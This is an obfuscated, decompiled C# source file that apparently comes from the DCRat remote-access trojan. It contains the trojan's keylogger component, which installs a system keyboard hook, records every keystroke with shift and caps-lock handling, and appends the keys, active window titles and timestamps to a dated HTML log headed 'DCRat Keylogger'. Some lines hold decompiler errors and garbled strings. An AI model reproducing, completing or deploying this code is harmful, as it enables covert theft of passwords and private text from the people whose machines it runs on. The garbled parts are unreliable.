using _0012;
using GDBD.Mocks;
using GDBD.Structs;
using GDBD.Workers;
using Newtonsoft.Annotations;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace GDBD.Specifications
{
	internal sealed class Collection
	{
		private static bool _Repository;

		private static string m_Server;

		private static string m_Facade;

		private static Publisher.Exception m_State;

		private static IntPtr m_Resolver;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void NewEvent(string task)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (!_Repository)
			{
				m_Server = task;
				_Repository = true;
				m_Resolver = IncludeEvent(m_State);
				Application.Run();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void ForgotEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (_Repository)
			{
				_Repository = false;
				Publisher.FindFilter(m_Resolver);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static IntPtr IncludeEvent(Publisher.Exception instance)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			using (Process process = Process.GetCurrentProcess())
			{
				return Publisher.PatchFilter(Publisher.utils, instance, Publisher.OrderFilter(process.ProcessName), 0u);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static IntPtr PushEvent(int lengthdef, IntPtr ord, IntPtr consumer)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (lengthdef >= 0 && ord == (IntPtr)256)
			{
				int num = Marshal.ReadInt32(consumer);
				bool flag = (Publisher.FillFilter((int)/*Error near IL_0037: Stack underflow*/) & 0xFFFF) != 0;
				bool flag2 = (Publisher.FillFilter((int)/*Error near IL_0047: Stack underflow*/) & 0x8000) != 0 || (Publisher.FillFilter((int)/*Error near IL_0058: Stack underflow*/) & 0x8000) != 0;
				string text = PrepareEvent((uint)num);
				text = ((!(flag || flag2)) ? text.ToLower() : text.ToUpper());
				string text2 = text;
				string text3 = text2;
				if (text3 != null)
				{
					switch (_0003._0001(text3))
					{
					case 957132539u:
						if (text3 == "<")
						{
							text = "&lt;";
						}
						break;
					case 990687777u:
						if (text3 == ">")
						{
							text = "&gt;";
						}
						break;
					case 638357778u:
						if (text3 == "#")
						{
							text = "&#35;";
						}
						break;
					case 588024921u:
						if (text3 == "&")
						{
							text = "&amp;";
						}
						break;
					case 655135397u:
						if (text3 == "\"")
						{
							text = "&quot;";
						}
						break;
					case 571247302u:
						if (text3 == "'")
						{
							text = "&apos;";
						}
						break;
					case 621580159u:
						if (text3 == " ")
						{
							text = "&nbsp;";
						}
						break;
					}
				}
				if (num >= 112 && num <= 135)
				{
					Keys keys = (Keys)num;
					text = "<span style=\"color: #F85C50;\">[" + keys.ToString() + "]</span>";
				}
				else
				{
					Keys keys = (Keys)num;
					string text4 = keys.ToString();
					string text5 = text4;
					if (text5 != null)
					{
						switch (_0003._0001(text5))
						{
						case 1123244352u:
							if (text5 == "Up")
							{
								text = "<span style=\"color: #F85C50;\">[Up]</span>";
							}
							break;
						case 2761510965u:
							if (text5 == "Down")
							{
								text = "<span style=\"color: #F85C50;\">[Down]</span>";
							}
							break;
						case 2457286800u:
							if (text5 == "Left")
							{
								text = "<span style=\"color: #F85C50;\">[Left]</span>";
							}
							break;
						case 513712005u:
							if (text5 == "Right")
							{
								text = "<span style=\"color: #F85C50;\">[Right]</span>";
							}
							break;
						case 3422663135u:
							if (text5 == "Return")
							{
								text = "<span style=\"color: #F85C50;\">[Enter]</span>";
							}
							break;
						case 3082514982u:
							if (text5 == "Escape")
							{
								text = "<span style=\"color: #F85C50;\">[ESC]</span>";
							}
							break;
						case 497839467u:
							if (text5 == "LControlKey")
							{
								text = "<span style=\"color: #F85C50;\">[CTRL]</span>";
							}
							break;
						case 3954224277u:
							if (text5 == "RControlKey")
							{
								text = "<span style=\"color: #F85C50;\">[CTRL]</span>";
							}
							break;
						case 3822460366u:
							if (text5 == "RShiftKey")
							{
								text = "<span style=\"color: #F85C50;\">[Shift]</span>";
							}
							break;
						case 4117013200u:
							if (text5 == "LShiftKey")
							{
								text = "<span style=\"color: #F85C50;\">[Shift]</span>";
							}
							break;
						case 3264564162u:
							if (text5 == "Back")
							{
								text = "<span style=\"color: #F85C50;\">[Back]</span>";
							}
							break;
						case 547024555u:
							if (text5 == "LWin")
							{
								text = "<span style=\"color: #F85C50;\">[Win]</span>";
							}
							break;
						case 4219689196u:
							if (text5 == "Tab")
							{
								text = "<span style=\"color: #F85C50;\">[Tab]</span>";
							}
							break;
						case 298493515u:
							if (text5 == "Capital")
							{
								text = ((!flag) ? "<span style=\"color: #F85C50;\">[CAPSLOCK: ON]</span>" : "<span style=\"color: #F85C50;\">[CAPSLOCK: OGeckoDBStruct]</span>");
							}
							break;
						}
					}
				}
				if (!File.Exists(m_Server + DateTime.Now.ToString("dd.MM.yyyy") + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent)))
				{
					File.WriteAllText(m_Server + DateTime.Now.ToString("dd.MM.yyyy") + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent), "<div style=\"color: white; background-color: #4d4d4d; border-radius: 100px 100px 15px 15px; padding: 3px 0 3px\"><center>DCRat Keylogger # " + DateTime.Now.ToString("dd.MM.yyyy") + "</center></div>");
				}
				using (StreamWriter streamWriter = new StreamWriter(m_Server + DateTime.Now.ToString("dd.MM.yyyy") + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent), append: true))
				{
					if (m_Facade == Publisher.InitEvent())
					{
						streamWriter.Write(text);
					}
					else
					{
						m_Facade = Publisher.InitEvent();
						streamWriter.WriteLine("<p style=\"color: #7AB1GeckoDBStruct; margin-bottom: 2px\">[" + Publisher.InitEvent() + " # " + DateTime.Now.ToString("HH:mm") + "]</p>");
						streamWriter.Write(text);
					}
				}
			}
			return Publisher.ValidateFilter(m_Resolver, lengthdef, ord, consumer);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static string PrepareEvent(uint assetZ)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] array = new byte[256];
				if (!Publisher.RunFilter(array))
				{
					return "";
				}
				uint custhigh = Publisher.EnableFilter(assetZ, 0u);
				uint pred;
				IntPtr param = Publisher.CompareFilter(Publisher.ResolveFilter(Publisher.IncludeFilter(), out pred));
				Publisher.AddFilter(assetZ, custhigh, array, stringBuilder, 5, 0u, param);
				return stringBuilder.ToString();
			}
			catch
			{
			}
			Keys keys = (Keys)assetZ;
			return keys.ToString();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public Collection()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static Collection()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			_Repository = false;
			m_Server = null;
			m_State = PushEvent;
			m_Resolver = IntPtr.Zero;
		}
	}
}
